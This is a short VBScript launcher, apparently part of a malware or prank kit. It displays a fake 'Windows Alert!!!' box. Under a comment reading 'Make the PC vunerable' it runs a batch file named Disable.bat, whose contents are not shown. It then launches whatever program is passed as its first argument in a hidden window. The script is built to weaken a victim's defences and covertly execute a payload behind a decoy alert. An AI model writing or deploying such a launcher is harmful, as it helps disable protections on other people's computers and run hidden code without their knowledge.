
''' Loads dependancys
DIM FSO, MyFile
Set oShell = CreateObject( "WScript.Shell" )



''' Alert Box
z=MsgBox(" ", 0+64, "Windows Alert!!!")


''' Make the PC vunerable
CreateObject("Wscript.Shell").Run """Disable.bat""", 1, True


CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
